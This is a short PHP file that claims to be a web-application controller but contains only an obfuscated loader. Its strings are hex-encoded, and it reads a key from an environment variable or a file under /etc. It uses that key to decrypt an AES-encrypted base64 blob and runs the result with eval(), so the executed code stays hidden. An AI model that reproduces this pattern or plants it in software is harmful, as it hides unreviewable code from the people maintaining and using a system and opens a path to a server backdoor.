<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LDytVAuwqViLorfrbBEnIA==');

$c=base64_decode(

'XNgXN6kpagf3lAE94UrGH0NsakUuaGaQ1hl28Zq2HCS1eaFPNwi93cuXgQqhXkbL4Fwa94RyR2wM' .
'stTpjFg2+6i1mlxeEJu+ISWoFBE8OiFMAdSs9/s+G543pgMrwynxtO6iW25pgPST07GR+P+LYtez' .
'OwJcJutM4GKm1R06GQvIrzc1q/JGpSvllJ00ChOAm8mNTJOVj6TOz1o5/znhVpYfu6Q8FAwySPRK' .
'M36yW2OkYBgXTXqJRW9aRfFIkliOAQIMVd3gjA07Hb9NCFMdhw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

